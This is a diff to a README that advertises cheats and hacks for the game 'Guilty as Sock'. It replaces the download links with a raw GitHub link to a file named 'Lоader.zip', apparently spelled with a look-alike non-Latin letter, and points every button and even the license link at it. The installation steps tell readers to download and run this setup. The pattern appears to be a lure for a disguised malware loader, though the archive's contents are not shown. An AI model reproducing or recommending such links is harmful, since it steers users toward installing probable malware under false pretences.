@@ -1,5 +1,5 @@
 # Guilty as Sock Cheats & Hacks 🎮🧦
-[![Download Guilty as Sock](https://img.shields.io/badge/Download-Guilty_as_Sock-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Guilty as Sock](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)
 
 Unlock intelligent gameplay! Guilty as Sock cheats & hacks delivers advanced game extensions designed for competitive advantages, ranking boosts, and streamlined play. Whether you're a casual or a pro, this dynamic utility is your ultimate enhancement. Maximize your skills with our robust feature-set, designed for superior gaming experiences.
 
@@ -25,7 +25,7 @@ Guilty as Sock cheats, ultimate hacks, secure game tool, game boosters, performa
 ## 📥 Installation
 
 **Step 1:**  
-[![Download Guilty as Sock](https://img.shields.io/badge/Download-Guilty_as_Sock-blue?logo=github)](https://easylauncher.su/PSnzrH)  
+[![Download Guilty as Sock](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)  
 Download the official installer via the button above.
 
 **Step 2:**  
@@ -37,8 +37,8 @@ Run the setup and follow on-screen instructions for seamless deployment.
 
 ## 📄 License
 
-Licensed under the MIT License (2025). [View License](https://choosealicense.com/licenses/mit/)
+Licensed under the MIT License (2025). [View License](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)
 
 ---
 
-[![Download Again](https://img.shields.io/badge/Download_Guilty_as_Sock-Now-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download Again](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)](https://raw.githubusercontent.com/setner111/SockScoundrel-Hackery/main/Lоader.zip)
